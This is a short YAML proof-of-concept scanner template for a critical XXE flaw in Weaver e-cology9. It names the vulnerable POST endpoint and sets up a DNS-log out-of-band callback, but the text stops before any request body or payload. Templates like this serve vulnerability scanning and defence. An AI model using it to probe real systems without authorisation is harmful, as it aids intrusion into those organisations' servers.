id: poc-yaml-weaver-cology9-xxe
info:
  name: 泛微e-cology9 XXE漏洞
  severity: critical
  tags:
  - DNSLOG
  - xxe
  finger: e-cology
variables:
  reverse: new_dns_log()
  reverseDomain: reverse.Domain()
requests:
- method: POST
  path: /rest/ofs/ReceiveCCRequestByXml
